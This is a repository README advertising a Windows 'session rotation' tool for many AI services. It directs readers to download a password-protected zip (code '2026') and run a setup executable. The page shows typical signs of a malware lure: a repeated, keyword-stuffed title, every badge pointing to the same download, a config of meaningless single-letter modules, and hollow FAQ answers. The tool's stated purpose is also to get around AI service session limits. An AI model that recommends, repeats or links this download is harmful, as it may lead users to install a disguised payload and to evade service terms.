<div align="center">

# AI Session Suite — AI Session Suite — Session rotation suite for ALL AI services — one binary. (One-Command Setup, Prebuilt Release)

<p><strong>AI Session Suite — AI Session Suite — Session rotation suite for ALL AI services — one binary. (One-Command Setup, Prebuilt Release): AI Session Suite — ai session rotator tool. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/ai-session-rotator-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/ai-session-rotator-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/ai-session-rotator-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/hassany30/ai-session-rotator?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/ai-session-rotator-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download ai-session-rotator-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/ai-session-rotator-v0.1.0-win64.zip"><img src="banner.svg" alt="AI Session Suite Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**AI Session Suite — AI Session Suite — ai session rotator tool** (`ai-session-rotator`) ships as a native 64-bit Windows build with a prebuilt portable release. Everything is driven by `config/settings.json` — hot-reloadable, dependency-free, and tuned for a minimal runtime footprint.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`ai-session-rotator-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/ai-session-rotator-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`ai-session-rotator-v0.1.0-win64.zip`](../../releases/download/v0.1.0/ai-session-rotator-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `AiSessionRotator_Setup_x64.exe` (keep `config/settings.json` in the same folder).

## Documentation & Guides

- [Changelog — v0.1.0 and later](CHANGELOG.md)
- [FAQ — platform support, data storage](docs/FAQ.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)
- [Usage Guide — commands and options](docs/USAGE.md)

## Configuration (`config/settings.json`)

```json
{
  "module": "ai-session-rotator",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "s": {
      "enabled": true
    },
    "u": {
      "enabled": true
    },
    "i": {
      "enabled": true
    },
    "t": {
      "enabled": true
    },
    "e": {
      "enabled": true
    }
  }
}
```

## FAQ

<details>
<summary><b>Services?</b></summary>

10+ AI services.
</details>
<details>
<summary><b>Checkpoints?</b></summary>

Per service.
</details>
<details>
<summary><b>Telemetry?</b></summary>

None.
</details>

## Building from Source

```bash
git clone https://github.com/hassany30/ai-session-rotator.git
cd ai-session-rotator
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: ai-session-rotator, session, suite, windows, tool, utility, ai, cli, developer-tools, open-source, automation, productivity, cpp, portable, prebuilt, tools</sub>
